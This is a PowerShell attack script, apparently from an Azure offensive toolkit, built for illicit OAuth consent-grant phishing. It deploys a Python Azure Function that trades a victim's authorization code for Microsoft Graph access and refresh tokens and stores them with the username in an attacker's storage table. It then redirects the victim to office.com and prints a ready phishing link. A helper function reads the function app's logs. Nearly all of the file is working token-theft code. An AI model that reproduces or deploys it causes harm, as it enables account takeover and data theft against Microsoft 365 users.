function New-MyAzFunctionForIllicitConsentGrant {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $True)]
        [string]$FunctionDeploymentURL,

        [Parameter(Mandatory = $True)]
        [string]$FunctionAppKey,

        [Parameter(Mandatory = $True)]
        [string]$FunctionName,

        [Parameter(Mandatory = $True)]
        [string]$ClientId,

		[Parameter(Mandatory = $True)]
        [string]$ClientSecret,

        [Parameter(Mandatory = $True)]
        [string]$ResourceScopeURL = "https://graph.microsoft.com/.default openid offline_access",

        [Parameter(Mandatory = $True)]
        [string]$TableConnectionString,

        [Parameter(Mandatory = $True)]
        [string]$TableNameExisting
    )

    # Create function in existing Function App
    $URL = "$($FunctionDeploymentURL)/admin/vfs/home/site/wwwroot/$FunctionName/__init__.py"

    $Params = @{
        "URI"     = $URL
        "Method"  = "PUT"
        "Headers" = @{
            "Content-Type" = "application/octet-stream"
            "x-functions-key" = $FunctionAppKey
        }
    }


    $Body = @"
import logging, uuid, subprocess
import azure.functions as func

def import_or_install_module(module_name):
    try:
        # Attempt to import the module
        import_module = __import__(module_name)
    except ImportError:
        # The module is not installed; install it
        subprocess.call(["pip", "install", module_name])

def main(req: func.HttpRequest, context: func.Context) -> func.HttpResponse:
    try:
        import_or_install_module("msal")
        import_or_install_module("azure.data.tables")
        import msal
        from azure.data.tables import TableServiceClient
        
        # Get access token from authorization code
        cache = msal.SerializableTokenCache()
        CLIENT_ID = "$ClientId"
        CLIENT_SECRET = "$ClientSecret" 
        Redirect = "$($FunctionDeploymentURL)/api/$FunctionName"
        AUTHORITY = "https://login.microsoftonline.com/common"
        SCOPE = ["$($ResourceScopeURL)"]
        code_val = req.params.get('code')
        app = msal.ConfidentialClientApplication(CLIENT_ID, authority=AUTHORITY, client_credential=CLIENT_SECRET, token_cache=cache)
        
        result = app.acquire_token_by_authorization_code(code=code_val,redirect_uri=Redirect,scopes=SCOPE)

        # Store access token in Storage account table
        connection_string = "$($TableConnectionString)"
        service = TableServiceClient.from_connection_string(conn_str=connection_string)
        table_client = service.get_table_client(table_name="$TableNameExisting")
        access_token = result["access_token"]
        refresh_token = result["refresh_token"]
        username = result["id_token_claims"]["preferred_username"]
        my_entity = {
        u'PartitionKey': str(uuid.uuid4()),
        u'RowKey': str(uuid.uuid4()),
        u'RawData': str(result),
        u'Access_Token': access_token,
        u'Refresh_Token': refresh_token,
        u'UserName':username
        }
        entity = table_client.create_entity(entity=my_entity)
    except Exception as e:
        connection_string = "$($TableConnectionString)"
        service = TableServiceClient.from_connection_string(conn_str=connection_string)
        table_client = service.get_table_client(table_name="$TableNameExisting")
        access_token = result["access_token"]
        refresh_token = result["refresh_token"]
        username = result["id_token_claims"]["preferred_username"]
        my_entity = {
        u'PartitionKey': str(uuid.uuid4()),
        u'RowKey': str(uuid.uuid4()),
        u'RawData': str(result),
        u'Access_Token': access_token,
        u'Refresh_Token': refresh_token,
        u'UserName':username
        }
        entity = table_client.create_entity(entity=my_entity)
    finally:
        headers = {"Location": "https://www.office.com"}
        return func.HttpResponse(headers=headers, status_code=302)
"@
    Invoke-RestMethod @Params -UseBasicParsing -Body $Body

    # Configure trigger for above Function
    $URL = "$($FunctionDeploymentURL)/admin/vfs/home/site/wwwroot/$FunctionName/function.json"

    $Params = @{
        "URI"     = $URL
        "Method"  = "PUT"
        "Headers" = @{
            "Content-Type" = "application/octet-stream"
            "x-functions-key" = $FunctionAppKey
        }
    }

    $Body = @"
{
  "bindings": [
    {
      "authLevel": "anonymous",
      "type": "httpTrigger",
      "direction": "in",
      "name": "req",
      "methods": [
        "get",
        "post"
      ]
    },
    {
      "type": "http",
      "direction": "out",
      "name": "`$return"
    }
  ]
}
"@

    Invoke-RestMethod @Params -UseBasicParsing -Body $Body

    Write-Host "Endpoint for auth code capture: $($FunctionDeploymentURL)/api/$FunctionName"
    Write-Host "Phishing link: https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($ClientId)&scope=$($ResourceScopeURL)&redirect_uri=$($FunctionDeploymentURL)/api/$FunctionName&response_mode=query"
}

function Get-MyAzFunctionAppLog {
    param (
        [Parameter(Mandatory = $True)]
        [string]$FunctionDeploymentURL,

        [Parameter(Mandatory = $True)]
        [string]$FunctionAppKey,

        [Parameter(Mandatory = $True)]
        [string]$FunctionName
    )
    $LogUrl = "$($FunctionDeploymentURL)/admin/vfs/LogFiles/Application/Functions/Function/$FunctionName/"

    $Params = @{
        "URI"     = $LogUrl
        "Method"  = "GET"
        "Headers" = @{
            "x-functions-key" = $FunctionAppKey
        }
    }

    Invoke-RestMethod @Params -UseBasicParsing
}